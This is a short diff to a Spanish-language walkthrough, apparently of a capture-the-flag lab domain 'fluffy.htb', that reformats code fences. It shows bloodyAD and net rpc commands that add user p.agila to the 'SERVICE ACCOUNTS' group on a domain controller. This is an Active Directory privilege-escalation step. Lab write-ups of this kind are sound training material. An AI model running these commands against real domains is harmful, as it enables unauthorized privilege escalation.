@@ -98,7 +98,9 @@ Añadimos al usuario `p.agila` al grupo `SERVICE ACCOUNTS`:
 
 ```bash
 bloodyAD --host dc01.fluffy.htb -u 'p.agila' -p <p.agila psswd> -d fluffy.htb add groupMember "SERVICE ACCOUNTS" p.agila
+```
 o
+```bash
 net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%<p.agila psswd> -S "dc01.fluffy.htb"
 ```
 
